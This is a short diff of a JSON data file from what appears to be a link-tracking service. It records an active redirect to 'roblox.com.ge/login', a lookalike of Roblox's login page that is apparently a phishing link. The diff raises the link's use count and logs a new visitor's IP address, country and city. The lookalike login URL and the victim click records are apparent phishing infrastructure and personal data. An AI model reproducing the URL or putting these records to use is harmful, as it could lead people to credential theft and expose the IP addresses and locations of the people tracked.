@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1038,
+    "useCount": 1039,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8424,6 +8424,14 @@
         "city": "Fortaleza",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777233340859,
+        "ip": "85.163.15.154",
+        "country": "Czechia",
+        "city": "Vracov",
+        "flag": "🇨🇿",
+        "countryCode": "CZ"
       }
     ]
   },
